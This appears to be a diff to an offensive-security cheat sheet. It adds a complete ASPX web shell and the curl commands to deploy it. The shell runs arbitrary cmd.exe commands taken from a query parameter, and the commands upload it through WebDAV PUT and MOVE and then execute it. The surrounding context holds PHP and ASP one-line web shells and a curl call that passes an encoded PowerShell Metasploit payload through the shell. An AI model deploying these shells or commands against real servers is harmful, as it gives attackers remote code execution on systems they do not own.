@@ -242,9 +242,18 @@ echo -n '<?=`$_GET[cmd]`?>' | tee x.php
 -->> ASP
 echo -n '<% Response.ContentType = "text/plain"\nSet s = CreateObject("WScript.Shell")\nSet c = s.Exec("cmd /c " & Request("cmd"))\nResponse.Write c.StdOut.ReadAll() %>' | tee x.asp
 
+-->> ASPX
+echo '<%@ Page Language="C#" Debug="true" Trace="false" %><%@ Import Namespace="System.Diagnostics" %><%@ Import Namespace="System.IO" %><script Language="c#" runat="server">void Page_Load(object sender, EventArgs e){if(Request.QueryString["cmd"]!=null){Response.ContentType="text/plain";Response.Write(Server.HtmlEncode(ExcuteCmd(Request.QueryString["cmd"])));Response.End();}}string ExcuteCmd(string arg){ProcessStartInfo ps=new ProcessStartInfo();ps.FileName="cmd.exe";ps.Arguments="/c "+arg;ps.RedirectStandardOutput=true;ps.UseShellExecute=false;Process p=Process.Start(ps);StreamReader stmrdr=p.StandardOutput;string s=stmrdr.ReadToEnd();stmrdr.Close();return s;}</script><HTML><body><form id="cmd" runat="server" onsubmit="return false;"><asp:TextBox id="i" runat="server"></asp:TextBox></form><pre id="r"></pre><script>document.getElementById("i").addEventListener("keydown",function(e){if(e.key==="Enter"){e.preventDefault();var v=this.value;fetch("?cmd="+encodeURIComponent(v)).then(r=>r.text()).then(t=>{document.getElementById("r").innerText=t;});}});</script></body></HTML>' | tee x.aspx
+
 +---------- Execute ----------+
+-->> PHP and ASP
 curl -G --path-as-is 'http://$TARGET/x.php' --data-urlencode 'cmd=whoami /priv'
 curl -G --path-as-is 'http://$TARGET/x.php' --data-urlencode 'cmd=powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQB...<METASPLOIT>...'
+
+-->> ASPX
+curl -X PUT -d @x.aspx http://$TARGET/x.txt
+curl -X MOVE http://$TARGET/x.txt -H 'Destination:http://$TARGET/x.aspx'
+curl -G --path-as-is 'http://$TARGET/x.aspx' --data-urlencode 'cmd=whoami /priv'
 
 +---------- Variations ----------+
 -->> PHP
